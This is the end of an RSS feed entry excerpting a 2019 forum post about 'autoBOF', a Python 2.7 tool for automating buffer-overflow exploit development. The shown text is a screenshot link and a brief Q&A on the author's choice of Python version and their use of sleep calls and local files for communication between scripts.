<p>Here’s a screenshot of my program in action: <a href="https://i.imgur.com/POnukSS.png" rel="nofollow noopener">https://i.imgur.com/POnukSS.png</a></p>
<p>Q&amp;A</p>
<hr>
<p>Q: Why did you write this in Python 2.7?</p>
<p>A: I didn’t actually know I wasn’t using the latest version of python until I had already committed to writing it in 2.7, which was the default version of python on my Linux distro. If Backbox/Kali used 3.0 by default this would have been written in that.</p>
<p>Q: What are those ugly sleep statements for? Why do your scripts communicate by reading and writing to local files?</p>
<p>A: I’m kind of self conscious about this because I’m pretty sure it’s a garbage way to solve this problem, but when I was trying to figure out how to have my scripts interact with each other at all this was the first thing I thought of and it’s what I did.</p>
<hr>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/1</link>
        <pubDate>Fri, 03 May 2019 23:29:30 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-1</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
  </channel>
</rss>
